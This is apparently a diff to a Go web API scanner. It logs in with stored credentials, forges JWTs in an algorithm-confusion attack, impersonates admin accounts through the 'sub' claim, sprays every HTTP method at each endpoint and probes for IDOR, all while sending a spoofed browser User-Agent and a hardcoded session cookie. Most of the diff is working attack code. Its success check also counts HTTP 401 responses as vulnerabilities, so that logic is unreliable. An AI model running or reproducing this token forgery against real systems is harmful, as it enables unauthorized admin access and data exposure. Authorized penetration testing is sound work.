@@ -22,6 +22,10 @@ import (
 
 func ReadLineFromFile(filename string) []string {
 	file, err := os.Open(filename)
+	if err != nil && !strings.Contains(filename, string(os.PathSeparator)) {
+		fallback := "endpoints_and_passwords" + string(os.PathSeparator) + filename
+		file, err = os.Open(fallback)
+	}
 	if err != nil {
 		fmt.Println("Error:", err)
 		return []string{}
@@ -59,7 +63,8 @@ func TestLoginIsJWT(url string, paths []string) (string, User) {
 					if err != nil {
 						fmt.Println(err)
 					}
-					req, err := http.NewRequest("POST", url+path, bytes.NewBuffer(jsonData))
+					fullURL := strings.TrimRight(url, "/") + "/" + strings.TrimLeft(path, "/")
+					req, err := http.NewRequest("POST", fullURL, bytes.NewBuffer(jsonData))
 					if err != nil {
 						fmt.Println(err)
 						return "", User{}
@@ -93,6 +98,64 @@ func TestLoginIsJWT(url string, paths []string) (string, User) {
 		}
 	}
 	return "", User{}
+}
+
+func GetAuthToken(url string, paths []string) (string, string, bool) {
+	loginURL, credentials := TestLoginIsJWT(url, paths)
+	if loginURL == "" {
+		return "", "", false
+	}
+
+	var responseData JSON
+	jsonData, err := json.Marshal(credentials.GetJSON())
+	if err != nil {
+		return "", "", false
+	}
+
+	req, err := http.NewRequest("POST", loginURL, bytes.NewBuffer(jsonData))
+	if err != nil {
+		return "", "", false
+	}
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0")
+	req.Header.Set("Referer", url+"/login")
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Content-Length", strconv.Itoa(len(jsonData)))
+	req.Header.Set("Origin", url)
+	req.Header.Set("Connection", "keep-alive")
+	req.Header.Set("Cookie", "chat_session_id=6012c3e0-8f24-45d7-9765-db79ee63ce88")
+
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", "", false
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != 200 {
+		return "", "", false
+	}
+
+	bodyBytes, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return "", "", false
+	}
+
+	err = json.Unmarshal(bodyBytes, &responseData)
+	if err != nil {
+		return "", "", false
+	}
+
+	token, ok := responseData["token"].(string)
+	if !ok || token == "" {
+		return "", "", false
+	}
+
+	bearerType, ok := responseData["type"].(string)
+	if !ok || bearerType == "" {
+		bearerType = "Bearer"
+	}
+
+	return token, bearerType, true
 }
 
 // if response is 200 ok then
@@ -205,48 +268,71 @@ func JWTConfusionAttack(url_org string, paths []string, token string, bearerType
 			fmt.Println("Error encoding modified JWT header:", err)
 			return nil, fmt.Errorf("error encoding modified JWT header: %v", err)
 		}
-		modifiedHeader := base64.RawURLEncoding.EncodeToString(modifiedHeaderJSON)
-		// Compute signature
-		message := modifiedHeader + "." + payload
-		h := hmac.New(sha256.New, []byte(KEY))
-		h.Write([]byte(message))
-		signature := base64.RawURLEncoding.EncodeToString(h.Sum(nil))
-		forgedToken := message + "." + signature
+		//use loop to change the sub in payload to admin or administrator
+		payloadJSON, err := base64.RawURLEncoding.DecodeString(payload)
+		if err != nil {
+			fmt.Println("Error decoding JWT payload:", err)
+			return nil, fmt.Errorf("error decoding JWT payload: %v", err)
+		}
+		var payloadData map[string]interface{}
+		err = json.Unmarshal(payloadJSON, &payloadData)
+		if err != nil {
+			fmt.Println("Error parsing JWT payload JSON:", err)
+			return nil, fmt.Errorf("error parsing JWT payload JSON: %v", err)
+		}
+		//originalSub, _ := payloadData["sub"].(string)
+		for _, adminSub := range []string{"admin", "administrator", "Admin", "Administrator"} {
+			payloadData["sub"] = adminSub
+			modifiedPayloadJSON, err := json.Marshal(payloadData)
+			if err != nil {
+				fmt.Println("Error encoding modified JWT payload:", err)
+				return nil, fmt.Errorf("error encoding modified JWT payload: %v", err)
+			}
+			payload = base64.RawURLEncoding.EncodeToString(modifiedPayloadJSON)
 
-		// Now test the endpoints with this forged token
-		baseURL := url_org
-		methods := []string{"GET", "POST", "PUT", "PATCH", "DELETE"}
-		for _, path := range paths {
-			for _, method := range methods {
-				fullURL := strings.TrimRight(baseURL, "/") + "/" + strings.TrimLeft(path, "/")
-				req, err := http.NewRequest(method, fullURL, nil)
-				if err != nil {
-					continue
-				}
-				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0")
-				req.Header.Set("Referer", baseURL)
-				req.Header.Set("Content-Type", "application/json")
-				req.Header.Set("Authorization", strings.TrimSpace(bearerType+" "+forgedToken))
-				req.Header.Set("Connection", "keep-alive")
-				req.Header.Set("Cookie", "chat_session_id=6012c3e0-8f24-45d7-9765-db79ee63ce88")
+			modifiedHeader := base64.RawURLEncoding.EncodeToString(modifiedHeaderJSON)
+			// Compute signature
+			message := modifiedHeader + "." + payload
+			h := hmac.New(sha256.New, []byte(KEY))
+			h.Write([]byte(message))
+			signature := base64.RawURLEncoding.EncodeToString(h.Sum(nil))
+			forgedToken := message + "." + signature
 
-				client := &http.Client{
-					CheckRedirect: func(req *http.Request, via []*http.Request) error {
-						return http.ErrUseLastResponse
-					},
-				}
-				resp, err := client.Do(req)
-				if err != nil {
-					continue
-				}
-				defer resp.Body.Close()
+			// Now test the endpoints with this forged token
+			baseURL := url_org
+			methods := []string{"GET", "POST", "PUT", "PATCH", "DELETE"}
+			for _, path := range paths {
+				for _, method := range methods {
+					fullURL := strings.TrimRight(baseURL, "/") + "/" + strings.TrimLeft(path, "/")
+					req, err := http.NewRequest(method, fullURL, nil)
+					if err != nil {
+						continue
+					}
+					req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0")
+					req.Header.Set("Referer", baseURL)
+					req.Header.Set("Content-Type", "application/json")
+					req.Header.Set("Authorization", strings.TrimSpace(bearerType+" "+forgedToken))
+					req.Header.Set("Connection", "keep-alive")
+					req.Header.Set("Cookie", "chat_session_id=6012c3e0-8f24-45d7-9765-db79ee63ce88")
 
-				if resp.StatusCode == 200 {
-					// print the token and decoded header and payload for debugging
-					foundIssues = append(foundIssues, "Possible JWT Confusion Attack Vulnerability")
-					foundIssues = append(foundIssues, fullURL+"  method: "+method)
-					foundIssues = append(foundIssues, forgedToken)
-					return foundIssues, nil
+					client := &http.Client{
+						CheckRedirect: func(req *http.Request, via []*http.Request) error {
+							return http.ErrUseLastResponse
+						},
+					}
+					resp, err := client.Do(req)
+					if err != nil {
+						continue
+					}
+					defer resp.Body.Close()
+
+					if resp.StatusCode == 200 || resp.StatusCode == 201 || resp.StatusCode == 401 {
+						// print the token and decoded header and payload for debugging
+						foundIssues = append(foundIssues, "Possible JWT Confusion Attack Vulnerability")
+						foundIssues = append(foundIssues, fullURL+"  method: "+method)
+						foundIssues = append(foundIssues, forgedToken)
+						return foundIssues, nil
+					}
 				}
 			}
 		}
@@ -434,26 +520,22 @@ func JWTAlgoNone(url_org string, paths []string, token string, bearerType string
 
 }
 
-func TestIDOR(fullURL string, id int, authToken string) string {
-	if id <= 0 {
-		return ""
-	}
-
+func TestIDOR(fullURL string, authHeader string) string {
 	u, err := url.Parse(fullURL)
 	if err != nil {
 		return ""
 	}
 
-	url1 := BuildPathURL(u, id)
-	url2 := BuildPathURL(u, id+1)
+	url1 := BuildPathURL(u, 1)
+	url2 := BuildPathURL(u, 2)
 
-	r1, err1 := MakeRequest(url1, authToken)
+	r1, err1 := MakeRequest(url1, authHeader)
 	if err1 != nil {
 		return ""
 	}
 	defer r1.Body.Close()
 
-	r2, err2 := MakeRequest(url2, authToken)
+	r2, err2 := MakeRequest(url2, authHeader)
 	if err2 != nil {
 		return ""
 	}
@@ -490,18 +572,37 @@ func BuildPathURL(u *url.URL, id int) string {
 	return copyURL.String()
 }
 
-func MakeRequest(requestURL string, authToken string) (*http.Response, error) {
+func MakeRequest(requestURL string, authHeader string) (*http.Response, error) {
 	req, err := http.NewRequest("GET", requestURL, nil)
 	if err != nil {
 		return nil, err
 	}
 
-	if authToken != "" {
-		req.Header.Set("Authorization", "Bearer "+authToken)
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0")
+	req.Header.Set("Referer", requestURL)
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Connection", "keep-alive")
+	req.Header.Set("Cookie", "chat_session_id=6012c3e0-8f24-45d7-9765-db79ee63ce88")
+
+	if authHeader != "" {
+		req.Header.Set("Authorization", authHeader)
 	}
 
 	client := &http.Client{}
 	return client.Do(req)
+}
+
+func TestIDORPaths(baseURL string, paths []string, authHeader string) []string {
+	var issues []string
+	for _, path := range paths {
+		fullURL := strings.TrimRight(baseURL, "/") + "/" + strings.TrimLeft(path, "/")
+		issue := TestIDOR(fullURL, authHeader)
+		if issue != "" {
+			issues = append(issues, issue)
+			issues = append(issues, fullURL)
+		}
+	}
+	return issues
 }
 
 func TestAuth(url string) string {
